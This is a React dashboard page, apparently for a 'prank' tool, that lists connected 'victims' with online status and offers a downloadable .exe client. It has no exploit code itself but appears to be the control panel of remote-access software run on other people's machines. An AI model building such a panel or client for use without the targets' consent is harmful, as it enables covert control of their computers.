import { createFileRoute, Link } from '@tanstack/react-router'
import { useSuspenseQuery } from '@tanstack/react-query'
import { convexQuery } from '@convex-dev/react-query'
import { api } from '../../convex/_generated/api'

export const Route = createFileRoute('/')({
  component: Dashboard,
})

function Dashboard() {
  const { data: victims } = useSuspenseQuery(convexQuery(api.victims.get, {}))

  return (
    <main className="min-h-screen bg-white text-black font-sans selection:bg-black selection:text-white">
      <div className="max-w-3xl mx-auto px-6 py-24">
        <header className="mb-16 flex items-end justify-between">
          <div>
            <h1 className="text-3xl font-bold tracking-tight mb-2">Prank Dashboard</h1>
            <p className="text-sm text-gray-500 tracking-wide uppercase">Select a Victim</p>
          </div>
          <a
            href="/prank.exe"
            download
            className="px-6 py-3 bg-black text-white font-bold text-sm hover:bg-gray-800 transition-colors flex items-center gap-2 group shadow-[4px_4px_0px_0px_rgba(0,0,0,0.1)] hover:shadow-[6px_6px_0px_0px_rgba(0,0,0,0.2)] active:translate-x-[2px] active:translate-y-[2px] active:shadow-none"
          >
            <svg 
              xmlns="http://www.w3.org/2000/svg" 
              width="18" 
              height="18" 
              viewBox="0 0 24 24" 
              fill="none" 
              stroke="currentColor" 
              strokeWidth="2.5" 
              strokeLinecap="round" 
              strokeLinejoin="round" 
              className="group-hover:translate-y-0.5 transition-transform"
            >
              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
              <polyline points="7 10 12 15 17 10"/>
              <line x1="12" x2="12" y1="15" y2="3"/>
            </svg>
            Download Client (.exe)
          </a>
        </header>

        <div className="space-y-6">
          {victims?.map((victim) => {
            const isOnline = Date.now() - victim.lastSeen < 30000;
            return (
              <Link
                key={victim._id}
                to="/victim/$id"
                params={{ id: victim._id }}
                className="flex items-center justify-between p-6 border-2 border-black hover:shadow-[4px_4px_0px_0px_rgba(0,0,0,1)] transition-all bg-white block"
              >
                <div>
                  <h2 className="text-xl font-bold">{victim.name}</h2>
                  <div className="flex items-center mt-2 space-x-2">
                    <span
                      className={`h-3 w-3 rounded-full ${
                        isOnline ? 'bg-green-500' : 'bg-gray-300'
                      }`}
                    />
                    <p className="text-sm text-gray-600">
                      {isOnline ? 'Online' : 'Offline'}
                    </p>
                  </div>
                </div>
                <div className="text-black font-bold">
                  →
                </div>
              </Link>
            )
          })}
          
          {(!victims || victims.length === 0) && (
            <div className="p-6 border-2 border-dashed border-gray-300 text-center text-gray-500">
              No victims found. Run the victim client to connect!
            </div>
          )}
        </div>
      </div>
    </main>
  )
}


